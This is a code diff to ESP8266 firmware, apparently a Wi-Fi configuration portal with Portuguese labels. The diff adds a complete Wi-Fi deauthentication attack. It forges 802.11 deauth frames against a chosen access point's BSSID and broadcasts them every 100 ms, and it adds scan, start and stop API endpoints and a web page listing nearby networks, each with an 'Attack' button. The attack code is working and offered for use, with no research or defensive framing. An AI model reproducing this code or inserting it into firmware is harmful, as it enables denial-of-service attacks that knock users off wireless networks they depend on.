@@ -6,12 +6,22 @@
 #include <LittleFS.h>
 #include <time.h>
 
+extern "C" {
+#include "user_interface.h"
+}
+
 #include "app_state.h"
 
 namespace
 {
   constexpr byte DNS_PORT = 53;
   DNSServer dnsServer;
+
+  bool deauthRunning = false;
+  uint8_t deauthBssid[6] = {0};
+  uint8_t deauthChannel = 1;
+  unsigned long lastDeauthBurstMs = 0;
+  constexpr unsigned long DEAUTH_BURST_INTERVAL_MS = 100;
 
   String escapeHtml(const String &value)
   {
@@ -34,6 +44,58 @@ namespace
     }
 
     return escaped;
+  }
+
+  bool parseBssid(const String &str, uint8_t *out)
+  {
+    if (str.length() != 17)
+      return false;
+    // Verify colons at expected positions
+    if (str[2] != ':' || str[5] != ':' || str[8] != ':' || str[11] != ':' || str[14] != ':')
+      return false;
+    for (int i = 0; i < 6; i++)
+    {
+      out[i] = (uint8_t)strtoul(str.substring(i * 3, i * 3 + 2).c_str(), nullptr, 16);
+    }
+    return true;
+  }
+
+  void sendDeauthBurst()
+  {
+    if (!deauthRunning)
+      return;
+    unsigned long now = millis();
+    if (now - lastDeauthBurstMs < DEAUTH_BURST_INTERVAL_MS)
+      return;
+    lastDeauthBurstMs = now;
+
+    wifi_set_channel(deauthChannel);
+
+    uint8_t packet[26] = {
+      // Frame Control: type=Management (00), subtype=Deauth (1100) → 0xC0
+      0xc0, 0x00,
+      // Duration
+      0x00, 0x00,
+      // Destination: broadcast
+      0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
+      // Source (AP BSSID – filled below)
+      0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+      // BSSID (AP BSSID – filled below)
+      0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+      // Sequence Control
+      0x00, 0x00,
+      // Reason Code: 1 = unspecified
+      0x01, 0x00
+    };
+
+    memcpy(&packet[10], deauthBssid, 6);
+    memcpy(&packet[16], deauthBssid, 6);
+
+    for (int i = 0; i < 5; i++)
+    {
+      wifi_send_pkt_freedom(packet, sizeof(packet), 0);
+      delay(1);
+    }
   }
 
   void loadWiFiConfig()
@@ -243,6 +305,7 @@ namespace
     page += "<button type='submit'>Salvar e conectar</button></form>";
     page += "<form method='get' action='/'><button class='secondary' type='submit'>Atualizar lista de redes</button></form>";
     page += "<form method='get' action='/status'><button class='secondary' type='submit'>Ver status completo</button></form>";
+    page += "<form method='get' action='/deauther'><button class='secondary' type='submit'>Deauther Wi-Fi</button></form>";
     page += "<p class='muted'>API: /api/status</p>";
     page += "</div></body></html>";
 
@@ -289,6 +352,7 @@ namespace
     doc["screen_change_interval_ms"] = screenChangeIntervalMs;
     doc["timezone_offset_hours"] = timezoneOffsetHours;
     doc["oled_brightness"] = oledBrightness;
+    doc["deauth_running"] = deauthRunning;
 
     String payload;
     serializeJson(doc, payload);
@@ -338,6 +402,111 @@ namespace
     connectStationWiFi();
   }
 
+  void handleScanAp()
+  {
+    int n = WiFi.scanNetworks();
+    String json = "[";
+    for (int i = 0; i < n; i++)
+    {
+      if (i > 0)
+        json += ",";
+      uint8_t *bssid = WiFi.BSSID(i);
+      char bssidStr[18];
+      snprintf(bssidStr, sizeof(bssidStr), "%02X:%02X:%02X:%02X:%02X:%02X",
+               bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5]);
+      JsonDocument entry;
+      entry["ssid"] = WiFi.SSID(i);
+      entry["bssid"] = bssidStr;
+      entry["channel"] = WiFi.channel(i);
+      entry["rssi"] = WiFi.RSSI(i);
+      String entryStr;
+      serializeJson(entry, entryStr);
+      json += entryStr;
+    }
+    json += "]";
+    WiFi.scanDelete();
+    server.send(200, "application/json; charset=utf-8", json);
+  }
+
+  void handleDeauthStart()
+  {
+    String bssidStr = server.arg("bssid");
+    int ch = server.arg("channel").toInt();
+    if (ch < 1 || ch > 14)
+    {
+      server.send(400, "application/json; charset=utf-8", "{\"error\":\"channel must be 1-14\"}");
+      return;
+    }
+    if (!parseBssid(bssidStr, deauthBssid))
+    {
+      server.send(400, "application/json; charset=utf-8", "{\"error\":\"invalid bssid\"}");
+      return;
+    }
+    deauthChannel = (uint8_t)ch;
+    deauthRunning = true;
+    lastDeauthBurstMs = 0;
+    server.send(200, "application/json; charset=utf-8", "{\"status\":\"started\"}");
+  }
+
+  void handleDeauthStop()
+  {
+    deauthRunning = false;
+    server.send(200, "application/json; charset=utf-8", "{\"status\":\"stopped\"}");
+  }
+
+  void handleDeautherPage()
+  {
+    String page;
+    page += "<!doctype html><html><head><meta charset='utf-8'>";
+    page += "<meta name='viewport' content='width=device-width,initial-scale=1'>";
+    page += "<style>body{font-family:Arial,sans-serif;background:#111;color:#eee;max-width:720px;margin:0 auto;padding:20px}";
+    page += "button{padding:8px 16px;border-radius:8px;border:0;font-weight:bold;cursor:pointer}";
+    page += ".btn-scan{background:#00a6ff;color:#fff} .btn-attack{background:#ff4757;color:#fff} .btn-stop{background:#2ed573;color:#111}";
+    page += ".card{background:#1b1b1b;padding:18px;border-radius:16px;margin-bottom:12px}";
+    page += "table{width:100%;border-collapse:collapse;margin-top:10px} th,td{padding:8px 10px;text-align:left;border-bottom:1px solid #333}";
+    page += "th{color:#aaa;font-size:13px} .status{margin:10px 0;padding:10px;border-radius:8px;background:#222}";
+    page += ".running{color:#ff4757} .stopped{color:#aaa}</style>";
+    page += "<script>";
+    page += "var aps=[];";
+    page += "async function scanAps(){";
+    page += "  document.getElementById('scanBtn').disabled=true;document.getElementById('scanBtn').innerText='Scanning...';";
+    page += "  try{const r=await fetch('/api/scan_ap');aps=await r.json();renderTable();}catch(e){alert('Scan failed');}";
+    page += "  document.getElementById('scanBtn').disabled=false;document.getElementById('scanBtn').innerText='Scan';";
+    page += "}";
+    page += "function renderTable(){";
+    page += "  var tb=document.getElementById('apTable');tb.innerHTML='';";
+    page += "  aps.forEach(function(ap){";
+    page += "    var tr=document.createElement('tr');";
+    page += "    tr.innerHTML='<td>'+escHtml(ap.ssid)+'</td><td>'+ap.bssid+'</td><td>'+ap.channel+'</td><td>'+ap.rssi+' dBm</td>'";
+    page += "    +'<td><button class=\"btn-attack\" onclick=\"startAttack(\\\"'+ap.bssid+'\\\",'+ap.channel+')\">Attack</button></td>';";
+    page += "    tb.appendChild(tr);";
+    page += "  });";
+    page += "}";
+    page += "function escHtml(s){return s.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');}";
+    page += "async function startAttack(bssid,ch){";
+    page += "  var fd=new FormData();fd.append('bssid',bssid);fd.append('channel',ch);";
+    page += "  await fetch('/api/deauth/start',{method:'POST',body:fd});updateStatus();";
+    page += "}";
+    page += "async function stopAttack(){await fetch('/api/deauth/stop',{method:'POST'});updateStatus();}";
+    page += "async function updateStatus(){";
+    page += "  try{const r=await fetch('/api/status');const j=await r.json();";
+    page += "  var el=document.getElementById('deauthStatus');";
+    page += "  if(j.deauth_running){el.innerHTML='<span class=\"running\">&#9679; Ataque ativo</span>';}";
+    page += "  else{el.innerHTML='<span class=\"stopped\">&#9675; Inativo</span>';}";
+    page += "  }catch(e){}}";
+    page += "setInterval(updateStatus,2000);window.onload=function(){scanAps();updateStatus();};";
+    page += "</script></head><body>";
+    page += "<div class='card'><h2>Wi-Fi Deauther</h2>";
+    page += "<div class='status' id='deauthStatus'><span class='stopped'>&#9675; Inativo</span></div>";
+    page += "<button class='btn-scan' id='scanBtn' onclick='scanAps()'>Scan</button>&nbsp;";
+    page += "<button class='btn-stop' onclick='stopAttack()'>Stop Attack</button>";
+    page += "<table><thead><tr><th>SSID</th><th>BSSID</th><th>Ch</th><th>RSSI</th><th>Acao</th></tr></thead>";
+    page += "<tbody id='apTable'></tbody></table></div>";
+    page += "<div class='card'><button onclick=\"location.href='/'\">Voltar</button></div>";
+    page += "</body></html>";
+    server.send(200, "text/html; charset=utf-8", page);
+  }
+
   void startConfigPortal()
   {
     server.on("/", HTTP_GET, handleRoot);
@@ -350,6 +519,10 @@ namespace
     server.on("/status", HTTP_GET, handleStatusPage);
     server.on("/api/status", HTTP_GET, handleStatusJson);
     server.on("/save", HTTP_POST, handleSave);
+    server.on("/deauther", HTTP_GET, handleDeautherPage);
+    server.on("/api/scan_ap", HTTP_GET, handleScanAp);
+    server.on("/api/deauth/start", HTTP_POST, handleDeauthStart);
+    server.on("/api/deauth/stop", HTTP_POST, handleDeauthStop);
     server.onNotFound(handleCaptiveRedirect);
     server.begin();
   }
@@ -381,4 +554,5 @@ void handlePortalClient()
 {
   server.handleClient();
   dnsServer.processNextRequest();
+  sendDeauthBurst();
 }
